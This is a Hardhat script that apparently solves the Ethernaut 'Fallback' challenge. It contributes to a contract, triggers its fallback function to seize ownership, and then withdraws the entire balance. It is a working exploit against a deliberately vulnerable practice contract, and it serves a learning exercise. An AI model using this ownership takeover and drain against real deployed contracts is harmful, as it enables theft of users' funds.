import { ethers } from "hardhat";
import { Fallback__factory } from "../typechain-types";

async function main() {
  // you claim ownership of the contract
  // you reduce its balance to 0

  let tx; // will have to wait for each tx
  let [deployer] = await ethers.getSigners();
  let contract = "0x38Deb6b0BBB370D1F1Dc1A5AAb8694C25f6F34dd";
  let fallback = new Fallback__factory(deployer).attach(contract);

  console.log(await deployer.address);

  // add record to mapping
  tx = await fallback.contribute({
    value: ethers.utils.parseEther("0.0001"),
  });
  await tx.wait();
  console.log("Contributed");

  // call fallback function to take over ownership
  tx = await deployer.sendTransaction({
    to: fallback.address,
    data: "0x",
    value: ethers.utils.parseEther("0.0001"),
  });
  await tx.wait();
  console.log("Send ETH via fallback");

  // reduce balance to 0
  tx = await fallback.withdraw();
  await tx.wait();
  console.log("Withdrawn");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
